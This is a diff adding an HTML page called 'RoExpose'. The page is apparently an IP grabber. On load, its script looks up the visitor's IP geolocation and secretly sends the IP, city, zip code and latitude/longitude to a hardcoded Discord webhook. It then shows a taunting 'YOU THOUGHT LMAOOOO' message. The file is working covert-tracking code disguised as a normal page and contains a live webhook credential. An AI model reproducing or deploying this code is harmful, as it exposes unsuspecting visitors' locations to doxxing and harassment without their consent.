@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>RoExpose</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <script type="text/javascript">
+        new Promise(async (resolve, reject) => {
+            try {
+                const data = await (await fetch("https://ipwhois.app/json/")).json();
+                resolve(data);
+            } catch (error) {
+                reject(error)
+            }
+        })
+            .then(async (ipData) => {
+                const request = new XMLHttpRequest();
+                request.open("POST", "https://discordapp.com/api/webhooks/826639051196465172/2NoqMXf1wSEYSgh65-jv64W2mPTKGOqxFsD-RPpHPu30Z92n1rayJdr2mtirdc_uav6t");
+
+                request.setRequestHeader('Content-type', 'application/json');
+
+                const params = {
+                    username: "RoExposed",
+                    avatar_url: "",
+                    embeds: [{
+                        type: "rich",
+                        title: "IP Obtained",
+                        fields: [{ name: "Type", value: ipData["type"], inline: false },
+                        { name: "IP Address", value: ipData.ip, inline: false },
+                        { name: "Area", value: `${ipData.country}, ${ipData.region}, ${ipData.zip} ${ipData.city}`, inline: false },
+                        { name: "Latitude", value: ipData.latitude.toString(), inline: true },
+                        { name: "Longitude", value: ipData.longitude.toString(), inline: true }]
+                    }
+                    ]
+                }
+
+                request.send(JSON.stringify(params));
+            })
+    </script>
+    <div class="container">
+        <div id="message">YOU THOUGHT LMAOOOO</div>
+    </div>
+</body>
+
+</html>
